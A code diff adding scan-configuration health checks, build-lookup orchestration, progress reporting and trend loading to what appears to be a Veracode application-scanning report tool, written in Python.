+        (SENSITIVE_JUPYTER_PATTERNS, "Jupyter notebook", ["Jupyter notebooks could contain sensitive data."]),
+    ]:
+        ff = _fancy_match_files(files, pats)
+        if ff:
+            issues.append(_chk("high", f'{len(ff)} {desc}(s) uploaded: {_top5(ff)}.'))
+            for rec in sr: recs.append(rec)
+            recs.append("Do not upload unnecessary files.")
+    return issues, recs
+
+def check_17_repositories(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    repo_f = [f["name"] for f in files if f["name"].lower() in ("fsmonitor-watchman.sample","fetch_head")]
+    if repo_f:
+        issues.append(_chk("medium", "A git repository was uploaded. Repositories can contain sensitive information."))
+        recs.append("Do not upload source code repositories.")
+    return issues, recs
+
+def check_18_node_modules(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []; nm_found: list[str] = []
+    for idx, m in enumerate(modules):
+        if _is_node_module(m["name"]):
+            if m["name"] not in nm_found: nm_found.append(m["name"])
+            modules[idx]["is_third_party"] = True; modules[idx]["is_ignored"] = True
+    if nm_found:
+        issues.append(_chk("medium", f'{len(nm_found)} "node_modules" folder(s) uploaded. This increases upload size and module count.'))
+        recs.append('Do not upload "node_modules" folders.')
+        recs.append("Use Veracode CLI: https://docs.veracode.com/r/About_auto_packaging.")
+    return issues, recs
+
+def check_19_testing_artefacts(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    sel_test = _fancy_match_modules(modules, TEST_FILE_PATTERNS, selected_only=True)
+    if sel_test:
+        issues.append(_chk("high", f'{len(sel_test)} testing artefact(s) selected: {_top5(sel_test)}.'))
+        recs.append("Do not upload testing artifacts. Do not select them as entry points.")
+    upl_test = _fancy_match_files(files, TEST_FILE_PATTERNS)
+    if upl_test:
+        issues.append(_chk("medium", f'{len(upl_test)} testing artefact(s) uploaded: {_top5(upl_test)}.'))
+        recs.append("Do not upload testing artifacts.")
+    test_mods = list(dict.fromkeys([m["name"] for m in modules for iss in m.get("issues",[]) if "test/" in iss.lower()]))
+    if test_mods:
+        issues.append(_chk("medium", f'{len(test_mods)} module(s) contain testing artefacts: {_top5(test_mods)}.'))
+    for idx, f in enumerate(files):
+        if _fancy_match(f["name"], TEST_FILE_PATTERNS): files[idx]["is_ignored"] = True
+    for idx, m in enumerate(modules):
+        if _fancy_match(m["name"], TEST_FILE_PATTERNS): modules[idx]["is_ignored"] = True
+    return issues, recs
+
+def check_20_too_many_files(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    if len(files) > MAX_FILE_COUNT:
+        issues.append(_chk("medium", f"Too many files uploaded ({len(files)}). May cause many modules and long scan times."))
+    return issues, recs
+
+def check_21_excess_microsoft(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    ef = _fancy_match_files(files, EXCESS_MSFT_PATTERNS)
+    if ef:
+        issues.append(_chk("medium", f'{len(ef)} .NET Roslyn/Runtime component(s) uploaded: {_top5(ef)}.'))
+        recs.append("Do not include unnecessary Microsoft runtime components.")
+    return issues, recs
+
+def check_22_loose_class_files(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    lcf = _fancy_match_files(files, LOOSE_CLASS_FILE)
+    lcm = _fancy_match_modules(modules, LOOSE_CLASS_MODULE)
+    if lcf or lcm:
+        issues.append(_chk("medium", "Java class files not packaged in JAR/WAR/EAR. Suboptimal compilation."))
+        recs.append("Compile Java into JAR/WAR/EAR per packaging instructions.")
+        recs.append("Use Veracode CLI: https://docs.veracode.com/r/About_auto_packaging.")
+    return issues, recs
+
+def check_23_go_workspace(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    gwf = _fancy_match_files(files, GO_WORKSPACE_PATTERNS)
+    if gwf:
+        issues.append(_chk("medium", "Go workspaces detected. Multi-module workspaces not supported."))
+        recs.append("Follow Go packaging: https://docs.veracode.com/r/compilation_go.")
+    return issues, recs
+
+def check_24_unselected_first_party(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    ufp = list(dict.fromkeys([m["name"] for m in modules if not m["is_dep"] and not m["is_ignored"]
+           and not m.get("is_selected") and not m["is_third_party"] and not _is_js_module(m["name"]) and not m["has_fatal"]]))
+    if ufp:
+        issues.append(_chk("medium", f'{len(ufp)} first-party module(s) not selected: {_top5(ufp)}.'))
+        recs.append("Under-selection affects quality: https://community.veracode.com/s/article/What-are-Modules-and-how-do-my-results-change-based-on-what-I-select.")
+    return issues, recs
+
+def check_25_over_scanning(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    """Detect modules selected that are dependencies of other selected modules."""
+    issues: list[Issue] = []; recs: list[str] = []
+    selected = {m["name"] for m in modules if m.get("is_selected") and not m["is_ignored"]}
+    dep_names = {m["name"] for m in modules if m["is_dep"]}
+    over = sorted(selected & dep_names)
+    if over:
+        issues.append(_chk("medium", f'{len(over)} module(s) selected but are dependencies of other modules: {_top5(over)}. This can lead to duplicate flaw reporting.'))
+        recs.append("Only select main entry points, not dependency libraries.")
+    return issues, recs
+
+def check_26_dependencies_selected(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    dep_sel = list(dict.fromkeys([m["name"] for m in modules if m.get("is_selected") and not m["is_ignored"] and m["is_dep"]]))
+    if dep_sel:
+        issues.append(_chk("medium", f'{len(dep_sel)} dependenc{"y" if len(dep_sel)==1 else "ies"} selected as entry point(s): {_top5(dep_sel)}.'))
+        recs.append("Only select main entry points: https://community.veracode.com/s/article/What-are-Modules-and-how-do-my-results-change-based-on-what-I-select.")
+    return issues, recs
+
+def check_27_duplicate_files(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    seen: dict[str, list[str]] = {}
+    for f in files:
+        if f.get("is_ignored") or f.get("is_third_party"): continue
+        seen.setdefault(f["name"], []).append(f.get("md5",""))
+    diff = {n: h for n, h in seen.items() if len(h) > 1 and len(set(h)) > 1}
+    same = {n: len(h) for n, h in seen.items() if len(h) > 1 and len(set(h)) == 1}
+    if diff:
+        issues.append(_chk("high", f'{len(diff)} duplicate filename(s) with different hashes: {_top5(list(diff.keys()))}. Can cause indeterministic results.'))
+    if same:
+        issues.append(_chk("medium", f'{len(same)} duplicate file(s) uploaded. Slows scan time.'))
+    if diff or same:
+        recs.append("De-duplicate modules before upload.")
+        recs.append("Upload only one version of each component.")
+    return issues, recs
+
+def check_28_minified_js(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    mf = list(dict.fromkeys([f["name"] for f in files if f["name"].lower().endswith(".min.js")]))
+    if mf:
+        issues.append(_chk("medium", f'{len(mf)} minified JS file(s) uploaded: {_top5(mf)}. Will not be scanned.'))
+        recs.append("Submit readable JavaScript source: https://docs.veracode.com/r/compilation_jscript.")
+    mm = list(dict.fromkeys([m["name"] for m in modules if _is_js_module(m["name"])
+        for iss in m.get("issues",[]) if "because we think it is minified" in iss or "dist/" in iss.lower()]))
+    if mm:
+        issues.append(_chk("medium", f'{len(mm)} minified JS within modules: {_top5(mm)}.'))
+    return issues, recs
+
+def check_29_module_count(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    issues: list[Issue] = []; recs: list[str] = []
+    sel = [m for m in modules if m.get("is_selected")]
+    if len(sel) > MAX_SELECTED_MODULE_COUNT:
+        issues.append(_chk("medium", f"{len(sel)} modules selected. Suboptimal configuration."))
+        recs.append("Select correct modules. Consider splitting application profiles.")
+    if len(modules) > MAX_MODULE_COUNT:
+        issues.append(_chk("medium", f"{len(modules)} modules identified. Suboptimal upload."))
+        recs.append("Follow packaging guidance.")
+    return issues, recs
+
+def check_30_regular_scans(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], last_scan: str) -> tuple[list[Issue], list[str]]:
+    """Scan recency, measured from the published date of this scan.
+
+    Sourced from detailedreport, which is fetched anyway, so this check costs
+    no additional API call.
+    """
+    issues: list[Issue] = []; recs: list[str] = []
+    if last_scan:
+        ds = _days_since(last_scan)
+        if ds is not None and ds > STALE_SCAN_DAYS:
+            issues.append(_chk("medium", f"Application not scanned recently (last policy scan {ds} days ago)."))
+            recs.append("Regular scanning via automation allows faster response to new issues.")
+    return issues, recs
+
+def check_31_analysis_size(files: list[dict], modules: list[dict], _f: FlawSummary, scan_meta: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
+    """Flag when analysis size or total module size exceeds thresholds."""
+    issues: list[Issue] = []; recs: list[str] = []
+    asz = scan_meta.get("analysis_size", 0)
+    if asz > MAX_ANALYSIS_SIZE:
+        # Thresholds are decimal (500_000_000), so report decimal MB. Dividing
+        # by 2^20 printed the 500 MB threshold as "476 MB".
+        issues.append(_chk("medium", f"Analysis size ({asz/1_000_000:.0f} MB) exceeds {MAX_ANALYSIS_SIZE//1_000_000} MB threshold."))
+        recs.append("Review packaging to exclude unnecessary files and third-party libraries.")
+    total_mod_size = sum(_parse_module_size(m.get("size","")) for m in modules)
+    if total_mod_size > MAX_TOTAL_MODULE_SIZE:
+        issues.append(_chk("medium", f"Total module size ({total_mod_size/1_000_000:.0f} MB) exceeds {MAX_TOTAL_MODULE_SIZE//1_000_000} MB threshold."))
+        recs.append("Reduce upload size by following packaging instructions.")
+    return issues, recs
+
+
+CHECK_REGISTRY: list[tuple[int, str, CheckFunc]] = [
+    (1, "ignoreJunkFiles", check_01_junk_files),
+    (2, "thirdParty", check_02_third_party),
+    (3, "flawCount", check_03_flaw_count),
+    (4, "fatalErrors", check_04_fatal_errors),
+    (5, "unscannableJava", check_05_unscannable_java),
+    (6, "detectUnwantedFiles", check_06_unwanted_files),
+    (7, "nestedArchives", check_07_nested_archives),
+    (8, "missingPrecompiled", check_08_missing_precompiled),
+    (9, "missingSCA", check_09_missing_sca),
+    (10, "unselectedJS", check_10_unselected_js),
+    (11, "unexpectedSource", check_11_unexpected_source),
+    (12, "missingSupporting", check_12_missing_supporting),
+    (13, "missingDebug", check_13_missing_debug),
+    (14, "unsupportedPlatform", check_14_unsupported_platform),
+    (15, "gradleWrapper", check_15_gradle_wrapper),
+    (16, "sensitiveFiles", check_16_sensitive_files),
+    (17, "repositories", check_17_repositories),
+    (18, "nodeModules", check_18_node_modules),
+    (19, "testingArtefacts", check_19_testing_artefacts),
+    (20, "tooManyFiles", check_20_too_many_files),
+    (21, "excessMicrosoft", check_21_excess_microsoft),
+    (22, "looseClassFiles", check_22_loose_class_files),
+    (23, "goWorkspace", check_23_go_workspace),
+    (24, "unselectedFirstParty", check_24_unselected_first_party),
+    (25, "overScanning", check_25_over_scanning),
+    (26, "dependenciesSelected", check_26_dependencies_selected),
+    (27, "duplicateFiles", check_27_duplicate_files),
+    (28, "minifiedJS", check_28_minified_js),
+    (29, "moduleCount", check_29_module_count),
+    (30, "regularScans", check_30_regular_scans),
+    (31, "analysisSize", check_31_analysis_size),
+]
+
+class CheckObserver:
+    """Optional hook into run_checks, used by the single-application report.
+
+    before() runs immediately before each check, on exactly the file and module
+    state that check is about to see. That matters because checks 1, 2, 18 and
+    19 mutate the is_ignored / is_third_party flags in place and later checks
+    read them, so evidence recomputed after run_checks returns would describe a
+    different state from the one the check judged.
+
+    after() receives the check's issues, or the exception it raised. run_checks
+    still logs and swallows the exception exactly as before; the observer is the
+    only way to tell "passed" from "crashed".
+
+    The bulk path passes no observer and pays nothing for this.
+    """
+
+    def before(self, num: int, name: str, files: list[dict], modules: list[dict]) -> None:
+        """Called before check `num` runs."""
+
+    def after(self, num: int, name: str, issues: list[Issue], recs: list[str],
+              error: Exception | None) -> None:
+        """Called after check `num` returns or raises."""
+
+
+def run_checks(files: list[dict], modules: list[dict], flaws: FlawSummary,
+               scan_meta: dict, sca_on: bool, sca_comps: list[str],
+               app_mod: str, skip: set[int] | None = None,
+               observer: CheckObserver | None = None,
+               ) -> tuple[list[Issue], list[str], dict[int, list[str]]]:
+    """Returns (all_issues, all_recs, check_recs) where check_recs maps check# to its recs."""
+    all_issues: list[Issue] = []; all_recs: list[str] = []
+    check_recs: dict[int, list[str]] = {}
+    for num, name, func in CHECK_REGISTRY:
+        if skip and num in skip: continue
+        if observer is not None:
+            observer.before(num, name, files, modules)
+        try:
+            iss, rcs = func(files, modules, flaws, scan_meta, sca_on, sca_comps, app_mod)
+            for i in iss:
+                i.check_num = num
+                i.check_name = name
+            all_issues.extend(iss)
+            if rcs:
+                check_recs[num] = rcs
+            for r in rcs:
+                if r not in all_recs: all_recs.append(r)
+        except Exception as e:
+            log.warning("Check #%d (%s) failed: %s", num, name, e)
+            if observer is not None:
+                observer.after(num, name, [], [], e)
+        else:
+            # Outside the try so an observer bug is never mistaken for a
+            # failing check.
+            if observer is not None:
+                observer.after(num, name, iss, rcs, None)
+    return all_issues, all_recs, check_recs
+
+
+# ==========================================================================
+# Orchestration
+# ==========================================================================
+
+MAX_BUILD_WALK = 5   # cap on how far back to walk when the newest is unpublished
+
+
+def _find_latest_published_build(client: VeracodeClient, aid: int,
+                                 sbx: str | None = None) -> dict | None:
+    """Locate the newest build with published results.
+
+    Fast path (one request): getbuildinfo.do without a build_id returns the most
+    recent scan. If it is published, we are done and never call getbuildlist.
+
+    Slow path: only when the newest scan is unpublished (mid-scan, prescan
+    failed, deleted results). Then we fetch the build list and walk back, but no
+    further than MAX_BUILD_WALK, so a profile with 400 historic builds and no
+    published results costs a bounded number of requests instead of 400.
+    """
+    latest = client.get_build_info(aid, sbx=sbx)
+    if latest and latest.get("published") and latest.get("build_id"):
+        return {"id": latest["build_id"], "ver": latest.get("version", "")}
+
+    builds = client.get_builds(aid, sbx)
+    if not builds:
+        # No list either: fall back to whatever the single lookup returned.
+        if latest and latest.get("build_id"):
+            return {"id": latest["build_id"], "ver": latest.get("version", "")}
+        return None
+
+    # getbuildlist.do does not document its order. Sort by numeric build_id
+    # (Veracode's own Go tool does the same) so "newest" is never a guess.
+    builds = sorted(builds, key=lambda b: int(b["id"]) if str(b.get("id") or "").isdigit() else -1)
+    newest_id = (latest or {}).get("build_id")
+    walked = 0
+    for b in reversed(builds):
+        if b["id"] == newest_id:
+            continue          # already known to be unpublished
+        walked += 1
+        if walked > MAX_BUILD_WALK:
+            log.debug("app %s: stopped walking builds after %d unpublished",
+                      aid, MAX_BUILD_WALK)
+            break
+        bi = client.get_build_info(aid, b["id"], sbx)
+        if bi and bi.get("published"):
+            return b
+    # Nothing published: return the newest build so prescan diagnostics still run.
+    return builds[-1]
+
+
+_SEV_RANK = {"low": 0, "medium": 1, "high": 2}
+
+
+def _recommendation_severities(issues: list[Issue],
+                               check_recs: dict[int, list[str]]) -> dict[str, str]:
+    """Map each recommendation string to the worst severity among the issues
+    of the checks that produced it. A string shared by several checks (for
+    example the auto-packaging link) takes the worst of them."""
+    out: dict[str, str] = {}
+    for i in issues:
+        for r in check_recs.get(i.check_num, []):
+            if _SEV_RANK.get(i.severity, 0) > _SEV_RANK.get(out.get(r, ""), -1):
+                out[r] = i.severity
+    return out
+
+
+def platform_urls(base: str, dr: dict, bid: str) -> tuple[str, str]:
+    """Review Modules and Triage Flaws deep links for a build. Both are empty
+    when the detailed report did not supply an account id."""
+    acct = dr.get("account_id",""); aid_str = dr.get("app_id","")
+    an_id = dr.get("analysis_id",""); sau = dr.get("sau_id",""); sbx_id = dr.get("sandbox_id",0)
+    rev_url = f"{base}/auth/index.jsp#AnalyzeAppModuleList:{acct}:{aid_str}:{bid}:{an_id}:{sau}::::{sbx_id}" if acct else ""
+    tri_url = f"{base}/auth/index.jsp#ReviewResultsStaticFlaws:{acct}:{aid_str}:{bid}:{an_id}:{sau}::::{sbx_id}" if acct else ""
+    return rev_url, tri_url
+
+
+def _process_build(client: VeracodeClient, app: dict, build: dict,
+                   legacy_id: int, sandbox_name: str = "",
+                   skip_checks: set[int] | None = None,
+                   prev_data: dict | None = None) -> tuple[ScanResult, list[ModuleRow], list[FileRow], list[RecommendationRow], list[AggIssue], TrendRow | None]:
+    if build is None:
+        sr = _empty_result(app, legacy_id, sandbox_name)
+        sr.issues_text = "[HIGH] No published build found"
+        sr.health = "Poor"; sr.high_issues = 1; sr.total_issues = 1
+        return sr, [], [], [], [], None
+
+    bid = build["id"]
+    # A published build always has a file list and prescan results, so once
+    # its detailed report exists, a failure on either is a retrieval failure
+    # and is raised (the caller records the profile as "Error", not as a
+    # clean scan with no files). For a build without results, prescan data
+    # may legitimately be missing and is fetched leniently, as before.
+    dr = client.get_detailed_report(bid, strict=True)
+    files = client.get_files(legacy_id, bid, strict=dr is not None)
+    prescan = client.get_prescan(legacy_id, bid, strict=dr is not None)
+
+    if dr is None:
+        fl = FlawSummary()
+        dr = {"account_id":"","app_id":"","sandbox_id":0,"sandbox_name":sandbox_name,
+              "analysis_id":"","sau_id":"","bu":"","app_name":app["name"],
+              "scan_name":build.get("ver",""),"engine":"",
+              "submitted":"","published":"","analysis_size":0,
+              "va_score":None,"va_rating":"","policy_status":"","policy_name":"",
+              "is_latest":True,"flaws":fl,"dr_modules":[],"sca_on":False,"sca_comps":[]}
+    else:
+        fl = dr["flaws"]
+
+    modules = _merge_modules(dr["dr_modules"], prescan)
+
+    rev_url, tri_url = platform_urls(client.base, dr, bid)
+
+    scan_meta = {"review_url": rev_url, "triage_url": tri_url, "analysis_size": dr.get("analysis_size",0)}
+    # Check #30 gets the scan's own published date. Sandboxes are excluded:
+    # sandbox scans are developer iterations and are not the signal for whether
+    # an application is under regular policy scanning.
+    recency_date = dr.get("published", "") if not sandbox_name else ""
+    issues, recs, check_recs = run_checks(files, modules, fl, scan_meta,
+                              dr.get("sca_on",False), dr.get("sca_comps",[]),
+                              recency_date, skip_checks)
+
+    hi = sum(1 for i in issues if i.severity=="high")
+    mi = sum(1 for i in issues if i.severity=="medium")
+    health = "Good" if not issues else ("Poor" if hi else ("Fair" if mi else "Good"))
+
+    ds = _days_since(dr.get("published",""))
+    dur_s = _dur_seconds(dr.get("submitted",""), dr.get("published",""))
+    dur = "" if dur_s is None else _fmt_seconds(dur_s)
+    sel = [m for m in modules if m.get("is_selected")]
+    sel_names = ", ".join(m["name"] for m in sel)
+    total_upload = sum(_parse_module_size(m.get("size","")) for m in modules)
+    asz = dr.get("analysis_size",0)
+
+    # Trend
+    trend: TrendRow | None = None
+    trend_label = ""
+    # Match the previous report on app id first, so a renamed profile keeps
+    # its trend; name is the fallback for reports without an App ID column.
+    sbx_key = sandbox_name or dr.get("sandbox_name","")
+    prev = None
+    if prev_data:
+        prev = prev_data.get((f"id:{legacy_id}", sbx_key)) or prev_data.get((app["name"], sbx_key))
+    if prev is not None:
+        ph = prev.get("Health",""); pf = _si(prev.get("Total Flaws")); po = _si(prev.get("Open Affecting Policy"))
+        if ph and health != ph:
+            trend_label = "Improved" if (health == "Good" or (health == "Fair" and ph == "Poor")) else "Degraded"
+        elif ph: trend_label = "Unchanged"
+        else: trend_label = "New"
+        trend = TrendRow(app_name=app["name"], sandbox=sandbox_name or dr.get("sandbox_name",""),
+            prev_health=ph, curr_health=health, change=trend_label,
+            prev_flaws=pf, curr_flaws=fl.total, flaw_delta=fl.total-pf,
+            prev_open_pol=po, curr_open_pol=fl.open_pol, open_pol_delta=fl.open_pol-po)
+    elif prev_data:
+        trend_label = "New"
+
+    sr = ScanResult(
+        app_name=app["name"], bu=app.get("bu",""), policy=app.get("policy",""),
+        app_id=legacy_id, sandbox=sandbox_name or dr.get("sandbox_name",""),
+        build_id=bid, scan_name=dr.get("scan_name",""),
+        is_latest=dr.get("is_latest",True),
+        scan_status="Results Ready" if dr.get("published") else "No Results",
+        published=dr.get("published",""), days_since=ds if ds is not None else "N/A",
+        duration=dur, duration_seconds=dur_s, engine=dr.get("engine",""),
+        analysis_size_mb=round(asz/(1024*1024),2) if asz else 0,
+        va_score=dr.get("va_score") if dr.get("va_score") is not None else "",
+        va_rating=dr.get("va_rating",""),
+        policy_status=dr.get("policy_status",""), policy_name=dr.get("policy_name",""),
+        total_upload_mb=round(total_upload/(1024*1024),2) if total_upload else 0,
+        files_uploaded=len(files), total_modules=len(modules),
+        selected_modules=len(sel), selected_names=sel_names[:500],
+        fatal_errors=sum(1 for m in modules if m["has_fatal"]),
+        flaws=fl, sca_count=len(dr.get("sca_comps",[])),
+        age_bucket=_age_bucket(ds),
+        health=health, health_trend=trend_label,
+        high_issues=hi, medium_issues=mi, total_issues=len(issues),
+        issues_text="; ".join(f"[{i.severity.upper()}] {i.description}" for i in issues) if issues else "None",
+        recs_text="; ".join(recs) if recs else "None",
+        review_url=rev_url, triage_url=tri_url,
+    )
+
+    mod_rows = [ModuleRow(app_name=app["name"], build_id=bid, name=m["name"],
+                status=m.get("status",""), selected=m.get("is_selected",False),
+                dependency=m["is_dep"], fatal=m["has_fatal"],
+                third_party=m["is_third_party"], ignored=m["is_ignored"],
+                platform=m.get("platform",""), compiler=m.get("compiler",""),
+                size=m.get("size",""), issues="; ".join(m.get("issues",[])))
+                for m in modules]
+
+    file_rows = [FileRow(app_name=app["name"], build_id=bid, name=f["name"],
+                 status=f["status"], md5=f["md5"],
+                 ignored=f["is_ignored"], third_party=f["is_third_party"])
+                 for f in files]
+
+    # Build recommendation rows. Each rec takes the worst severity among the
+    # issues raised by the check(s) that emitted it. (It previously scanned
+    # every issue, so every rec got the application's worst severity.)
+    rec_sev = _recommendation_severities(issues, check_recs)
+    rec_rows: list[RecommendationRow] = []
+    for r in recs:
+        rec_rows.append(RecommendationRow(app_name=app["name"], build_id=bid,
+                    severity=rec_sev.get(r, "low"), recommendation=r, doc_url=_extract_url(r)))
+
+    # Build structured aggregation issues (one per issue, with check metadata and matched rec)
+    sb_name = sandbox_name or dr.get("sandbox_name", "")
+    agg_issues: list[AggIssue] = []
+    for i in issues:
+        # Get the first recommendation from this specific check
+        check_rec_list = check_recs.get(i.check_num, [])
+        matched_rec = check_rec_list[0] if check_rec_list else ""
+        agg_issues.append(AggIssue(
+            app_name=app["name"], bu=app.get("bu", ""), sandbox=sb_name,
+            check_num=i.check_num, check_name=i.check_name,
+            category=CHECK_CATEGORIES.get(i.check_num, "Other"),
+            severity=i.severity, description=i.description,
+            recommendation=matched_rec,
+        ))
+
+    return sr, mod_rows, file_rows, rec_rows, agg_issues, trend
+
+
+def _empty_result(app: dict, lid: int, sandbox: str = "") -> ScanResult:
+    """Profile genuinely has no policy scan."""
+    return ScanResult(app_name=app["name"], bu=app.get("bu",""), policy=app.get("policy",""),
+        app_id=lid, sandbox=sandbox, scan_status="No Scan", health="Poor",
+        high_issues=1, total_issues=1, issues_text="[HIGH] No policy scan found",
+        recs_text="None", age_bucket="N/A")
+
+
+def _error_result(app: dict, lid: int, err: str, sandbox: str = "") -> ScanResult:
+    """Retrieval failed. Deliberately distinct from _empty_result: a transient
+    API error must never be reported as 'this application was never scanned',
+    because that is a materially different and misleading conclusion."""
+    return ScanResult(app_name=app["name"], bu=app.get("bu",""), policy=app.get("policy",""),
+        app_id=lid, sandbox=sandbox, scan_status="Error", health="Unknown",
+        high_issues=0, total_issues=0,
+        issues_text=f"[ERROR] Could not retrieve scan data: {err[:200]}",
+        recs_text="Re-run this application; results are unavailable, not absent.",
+        age_bucket="N/A")
+
+
+def _process_app(client: VeracodeClient, app: dict, skip_no: bool, inc_sb: bool,
+                 skip_checks: set[int] | None, prev_data: dict | None,
+                 resume_keys: set[tuple[str, str]] | None
+                 ) -> tuple[list[ScanResult], list[ModuleRow], list[FileRow], list[RecommendationRow], list[AggIssue], list[TrendRow]]:
+    lid = app.get("legacy_id")
+    if not lid: return [], [], [], [], [], []
+    rs: list[ScanResult] = []; ms: list[ModuleRow] = []; fs: list[FileRow] = []
+    rrs: list[RecommendationRow] = []; ais: list[AggIssue] = []; ts: list[TrendRow] = []
+
+    key = (app["name"], "")
+    if resume_keys and key in resume_keys:
+        log.debug("    Skipping (already checkpointed): %s", app["name"])
+        return rs, ms, fs, rrs, ais, ts
+
+    build = _find_latest_published_build(client, lid)
+    if build is None:
+        if skip_no: return rs, ms, fs, rrs, ais, ts
+        rs.append(_empty_result(app, lid))
+        return rs, ms, fs, rrs, ais, ts
+
+    sr, mr, fr, rr, ai, tr = _process_build(client, app, build, lid,
+                                         skip_checks=skip_checks, prev_data=prev_data)
+    rs.append(sr); ms.extend(mr); fs.extend(fr); rrs.extend(rr); ais.extend(ai)
+    if tr: ts.append(tr)
+
+    if inc_sb:
+        for sb in client.get_sandboxes(lid):
+            sb_key = (app["name"], sb["name"])
+            if resume_keys and sb_key in resume_keys: continue
+            sb_build = _find_latest_published_build(client, lid, sb["id"])
+            if sb_build is None: continue
+            try:
+                sr2, mr2, fr2, rr2, ai2, tr2 = _process_build(client, app, sb_build, lid, sb["name"],
+                                                           skip_checks=skip_checks, prev_data=prev_data)
+            except AuthError:
+                raise
+            except Exception as e:
+                # One failed sandbox must not discard the policy result already
+                # collected for this profile: record that sandbox as Error.
+                log.warning("    [!] %s [%s]: %s: %s", app["name"], sb["name"], type(e).__name__, e)
+                rs.append(_error_result(app, lid, f"{type(e).__name__}: {e}", sb["name"]))
+                continue
+            rs.append(sr2); ms.extend(mr2); fs.extend(fr2); rrs.extend(rr2); ais.extend(ai2)
+            if tr2: ts.append(tr2)
+
+    return rs, ms, fs, rrs, ais, ts
+
+
+# ==========================================================================
+# Progress
+# ==========================================================================
+
+class Progress:
+    """Throughput and ETA reporting for runs measured in hours."""
+
+    def __init__(self, total: int, already_done: int = 0, every: int = 25,
+                 every_seconds: float = 120.0) -> None:
+        self.total = total
+        self.done = 0
+        self.errors = 0
+        self.skipped = already_done
+        self.every = max(1, every)
+        self.every_seconds = every_seconds
+        self.started = time.monotonic()
+        self._last = self.started
+        self._lock = threading.Lock()
+
+    def tick(self, error: bool = False) -> None:
+        with self._lock:
+            self.done += 1
+            if error:
+                self.errors += 1
+            now = time.monotonic()
+            due = (self.done % self.every == 0) or (now - self._last >= self.every_seconds)
+            if not due:
+                return
+            self._last = now
+            elapsed = now - self.started
+            rate = self.done / elapsed * 60.0 if elapsed > 0 else 0.0
+            remaining = self.total - self.done
+            eta = remaining / rate * 60.0 if rate > 0 else 0.0
+            log.info("[=] %d/%d profiles (%.1f%%) | %.1f/min | %d error(s) | "
+                     "elapsed %s | ETA %s",
+                     self.done, self.total, _pct(self.done, self.total),
+                     rate, self.errors, _hms(elapsed), _hms(eta) if rate else "unknown")
+
+
+def _hms(seconds: float) -> str:
+    s = int(max(0, seconds))
+    h, r = divmod(s, 3600)
+    m, sec = divmod(r, 60)
+    if h:
+        return f"{h}h{m:02d}m"
+    return f"{m}m{sec:02d}s" if m else f"{sec}s"
+
+
+# ==========================================================================
+# Trend
+# ==========================================================================
+
+def _load_previous(path: str) -> dict[tuple[str, str], dict]:
+    data: dict[tuple[str, str], dict] = {}
+    try:
+        wb = load_workbook(path, read_only=True)
+        ws = wb["Scan Health Summary"]
+        headers = [c.value for c in next(ws.iter_rows(min_row=1, max_row=1))]
+        for row in ws.iter_rows(min_row=2, values_only=True):
+            rd = dict(zip(headers, row))
+            # Keyed by app id when the report has one (renames keep their
+            # trend), else by name. One key per row so consumers that iterate
+            # .values() never see a row twice.
+            aid = str(rd.get("App ID") or "").strip()
+            name_or_id = f"id:{aid}" if aid and aid != "0" else str(rd.get("App Name",""))
+            key = (name_or_id, str(rd.get("Sandbox","") or ""))
+            data[key] = rd
+        wb.close()
+    except Exception as e:
+        log.warning("Could not load previous report: %s", e)
+    return data
+
+
+def _load_previous_agg(path: str) -> dict[int, int]:
+    """Read 'Check # -> Apps Affected' from a prior report's Tenant Aggregation
+    sheet so the dashboard can trend each health check over time. Optional: an
+    older report without that sheet simply yields no baseline."""
+    counts: dict[int, int] = {}
+    try:
+        wb = load_workbook(path, read_only=True)
+        if "Tenant Aggregation" not in wb.sheetnames:
+            wb.close(); return counts
+        ws = wb["Tenant Aggregation"]
+        headers = [c.value for c in next(ws.iter_rows(min_row=1, max_row=1))]
+        ci = headers.index("Check #") if "Check #" in headers else -1
+        ai = headers.index("Apps Affected") if "Apps Affected" in headers else -1
+        if ci >= 0 and ai >= 0:
+            for row in ws.iter_rows(min_row=2, values_only=True):
+                n = _si(row[ci], -1)
+                if n > 0: counts[n] = _si(row[ai])
+        wb.close()
+    except Exception as e:
+        log.debug("Could not load previous aggregation: %s", e)
+    return counts
+
+
+# ==========================================================================
+# Output
+# ==========================================================================
+
